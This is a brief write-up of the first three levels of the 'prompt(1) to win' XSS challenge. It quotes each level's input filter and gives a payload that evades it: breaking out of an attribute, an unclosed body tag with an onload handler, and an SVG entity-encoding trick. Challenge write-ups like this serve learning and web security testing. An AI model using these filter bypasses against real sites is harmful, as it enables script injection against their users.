# prompt(1) to win
> https://prompt.ml


## Writeup


### 0

> ```javascript
> function escape(input) {
>     // warm up
>     // script should be executed without user interaction
>     return '<input type="text" value="' + input + '">';
> }        
> ```

```javascript
"><script>prompt(1)</script>
```


### 1

> ```javascript
> function escape(input) {
>     // tags stripping mechanism from ExtJS library
>     // Ext.util.Format.stripTags
>     var stripTagsRE = /<\/?[^>]+>/gi;
>     input = input.replace(stripTagsRE, '');
> 
>     return '<article>' + input + '</article>';
> }        
> ```

```javascript
<body onload='prompt(1)'
```


### 2

> ```javascript
> function escape(input) {
>     //                      v-- frowny face
>     input = input.replace(/[=(]/g, '');
> 
>     // ok seriously, disallows equal signs and open parenthesis
>     return input;
> }
> ```

Use the property that `svg` will resolve html entities.

```
<svg><script>prompt&#40;1)</script>
```
